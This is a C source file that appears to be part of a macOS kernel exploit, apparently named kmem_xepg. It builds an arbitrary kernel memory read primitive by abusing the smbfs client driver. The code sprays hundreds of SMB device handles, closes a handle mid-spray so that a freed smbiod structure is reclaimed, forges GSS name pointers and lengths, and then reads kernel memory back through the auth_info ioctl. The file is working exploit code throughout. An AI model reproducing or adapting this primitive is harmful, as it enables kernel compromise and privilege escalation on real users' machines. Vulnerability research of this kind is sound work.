//
//  smbiod_rw.c
//  kmem_xepg
//
//  Created by admin on 12/31/21.
//

#include <stdlib.h>
#include <unistd.h>

#include <dispatch/dispatch.h>

#include <xe/util/assert.h>
#include <xe/util/dispatch.h>
#include <xe/util/log.h>
#include <xe/util/binary.h>

#include "../external/smbfs/smb_conn.h"
#include "../smb/client.h"

#include "smbiod_rw.h"

#include "macos_params.h"


#define KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT 650


struct kmem_smbiod_rw {
    struct sockaddr_in smb_addr;
    int fd_rw;
    int fd_iod;
};


kmem_smbiod_rw_t kmem_smbiod_rw_create(const struct sockaddr_in* smb_addr, int fd_rw, int fd_iod) {
    kmem_smbiod_rw_t rw = malloc(sizeof(struct kmem_smbiod_rw));
    rw->fd_iod = fd_iod;
    rw->fd_rw = fd_rw;
    rw->smb_addr = *smb_addr;
    return rw;
}


void kmem_smbiod_rw_read_iod(kmem_smbiod_rw_t rw, struct smbiod* out) {
    struct smbiod iod1;
    struct smbiod iod2;
    
    uint32_t gss_target_nt;
    int error = smb_client_ioc_auth_info(rw->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &gss_target_nt);
    xe_assert_err(error);
    
    error = smb_client_ioc_auth_info(rw->fd_rw, (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2), NULL);
    xe_assert_err(error);
    
    if (iod1.iod_gss.gss_target_nt == gss_target_nt && XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)iod1.iod_tdesc)) {
        *out = iod1;
    } else if (iod2.iod_gss.gss_target_nt == gss_target_nt && XE_VM_KERNEL_ADDRESS_VALID((uintptr_t)iod2.iod_tdesc)) {
        *out = iod2;
    } else {
        xe_log_error("read failed, gss_target_nt does not match");
        abort();
    }
}


void kmem_smbiod_rw_write_iod(kmem_smbiod_rw_t rw, const struct smbiod* value) {
    xe_log_debug("smbiod_rw write start");
    
    int* fds_capture = alloca(sizeof(int) * KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        fds_capture[index] = smb_client_open_dev();
        xe_assert(fds_capture[index] >= 0);
        int error = smb_client_ioc_negotiate(fds_capture[index], &rw->smb_addr, sizeof(rw->smb_addr), FALSE);
        xe_assert_err(error);
    });
    
    uint32_t gss_target_nt_base = rand();
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (index == 32) { close(rw->fd_rw); }
        struct smbiod iod1 = *value;
        iod1.iod_gss.gss_target_nt = gss_target_nt_base + (int)index * 2;
        struct smbiod iod2 = *value;
        iod2.iod_gss.gss_target_nt = iod1.iod_gss.gss_target_nt + 1;
        int error = smb_client_ioc_ssn_setup(fds_capture[index], (char*)&iod1, sizeof(iod1), (char*)&iod2, sizeof(iod2));
        if (error) {
            xe_log_warn("smb ssn setup failed, err: %s\n", strerror(error));
        }
    });
    
    uint32_t new_gss_target_nt;
    int error = smb_client_ioc_auth_info(rw->fd_iod, NULL, UINT32_MAX, NULL, UINT32_MAX, &new_gss_target_nt);
    xe_assert_err(error);
    
    if ((new_gss_target_nt - gss_target_nt_base) % 2 == 0) {
        xe_log_debug("captured by gss_cpn");
    } else {
        xe_log_debug("captured by gss_spn");
    }
    
    int captured_idx = (new_gss_target_nt - gss_target_nt_base) / 2;
    xe_assert_cond(captured_idx, >=, 0)
    xe_assert_cond(captured_idx, <, KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT);
    rw->fd_rw = fds_capture[captured_idx];
    
    dispatch_apply(KMEM_SMBIOD_RW_CAPTURE_ALLOCATOR_COUNT, DISPATCH_APPLY_AUTO, ^(size_t index) {
        if (index != captured_idx) {
            close(fds_capture[index]);
        }
    });
    
    xe_log_debug("smbiod_rw write complete");
}


void kmem_smbiod_rw_read_data(kmem_smbiod_rw_t rw, void* dst, uintptr_t src, size_t size) {
    xe_assert(size <= UINT32_MAX);
    struct smbiod iod;
    kmem_smbiod_rw_read_iod(rw, &iod);
    xe_assert_kaddr((uintptr_t)iod.iod_tdesc);
    iod.iod_gss.gss_cpn = (uint8_t*)src;
    iod.iod_gss.gss_cpn_len = (uint32_t)size;
    kmem_smbiod_rw_write_iod(rw, &iod);
    int error = smb_client_ioc_auth_info(rw->fd_iod, (char*)dst, (uint32_t)size, NULL, UINT32_MAX, NULL);
    xe_assert_err(error);
}


void kmem_smbiod_rw_destroy(kmem_smbiod_rw_t* rw_p) {
    kmem_smbiod_rw_t rw = *rw_p;
    close(rw->fd_iod);
    close(rw->fd_rw);
    free(rw);
    *rw_p = NULL;
}
